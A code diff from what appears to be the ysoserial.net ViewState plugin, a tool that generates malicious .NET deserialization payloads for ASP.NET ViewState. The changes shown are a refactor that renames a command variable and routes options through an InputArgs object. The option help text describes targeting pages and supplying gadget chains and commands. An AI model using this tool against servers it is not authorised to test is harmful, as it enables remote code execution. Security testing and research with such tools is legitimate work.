@@ -9,6 +9,7 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Web.Configuration;
 using ysoserial.Generators;
+using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
@@ -31,7 +32,7 @@ namespace ysoserial.Plugins
         static bool useSimpleType = true;
         static bool isDebug = false;
         static string gadget = "ActivitySurrogateSelector";
-        static string cmd = "";
+        static string command = "";
         static string unsignedPayload = "";
 
         static bool isLegacy = false;
@@ -57,7 +58,7 @@ namespace ysoserial.Plugins
                 {"examples", "to show a few examples. Other parameters will be ignored", v => showExamples = v != null },
                 /*{"dryrun", "to create a valid ViewState without using an exploit payload. The gadget and command parameters will be ignored", v => dryRun = v != null },*/
                 {"g|gadget=", "a gadget chain that supports LosFormatter. Default: ActivitySurrogateSelector", v => gadget = v },
-                {"c|command=", "the command suitable for the used gadget (will be ignored for ActivitySurrogateSelector)", v => cmd = v },
+                {"c|command=", "the command suitable for the used gadget (will be ignored for ActivitySurrogateSelector)", v => command = v },
                 {"upayload=", "the unsigned LosFormatter payload in (base64 encoded). The gadget and command parameters will be ignored", v => unsignedPayload = v },
                 { "generator=", "the __VIEWSTATEGENERATOR value which is in HEX, useful for .NET <= 4.0. When not empty, 'legacy' will be used and 'path' and 'apppath' will be ignored.", v => viewstateGenerator = v},
                 {"path=", "the target web page. example: /app/folder1/page.aspx", v => targetPagePath = v},
@@ -96,10 +97,14 @@ namespace ysoserial.Plugins
 
         public object Run(string[] args)
         {
+            InputArgs inputArgs = new InputArgs();
             List<string> extra;
             try
             {
                 extra = options.Parse(args);
+                inputArgs.CmdFullString = command;
+                inputArgs.Minify = minify;
+                inputArgs.UseSimpleType = useSimpleType;
             }
             catch (OptionException e)
             {
@@ -117,7 +122,7 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            if (String.IsNullOrEmpty(cmd) && !dryRun)
+            if (String.IsNullOrEmpty(command) && !dryRun)
             {
                 Console.Write("ysoserial: ");
                 Console.WriteLine("Incorrect plugin mode/arguments combination");
@@ -184,7 +189,7 @@ namespace ysoserial.Plugins
                 // Check Generator supports specified formatter
                 if (generator.IsSupported(formatter))
                 {
-                    payloadString = System.Text.Encoding.ASCII.GetString((byte[])generator.Generate(cmd, formatter, false, minify, useSimpleType));
+                    payloadString = System.Text.Encoding.ASCII.GetString((byte[])generator.GenerateWithNoTest(formatter, inputArgs));
                 }
                 else
                 {
